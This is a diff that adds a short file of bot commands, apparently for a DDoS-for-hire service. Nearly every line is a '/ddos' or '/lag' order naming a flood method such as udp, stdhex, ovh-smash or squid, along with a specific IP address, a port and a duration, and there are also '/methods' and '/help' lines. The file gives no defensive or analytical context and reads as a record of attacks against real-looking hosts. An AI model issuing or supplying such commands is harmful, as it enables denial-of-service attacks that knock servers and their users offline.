@@ -1,0 +1,15 @@
+/ddos stdhex 51.138.8.205 30026 100
+/ddos stdhex 51.138.8.205 100 30026
+/ddos std 51.138.8.205 100 30026
+/ddos udp 51.138.15.156 10 30035
+/ddos udpplain 51.124.141.179 10 30040
+/ddos udp 51.124.141.179 35 30040
+/ddos stdhex 20.50.213.237 10 30038
+/ddos ovh-smash 20.50.213.237 10 30038
+/steamcode
+/lag stdhex 51.138.102.44 30 30002
+/ddos stdhex 51.138.102.44 30 30002
+/help
+/methods
+/ddos stdhex 137.220.62.238 120
+/ddos squid 137.220.62.238 120
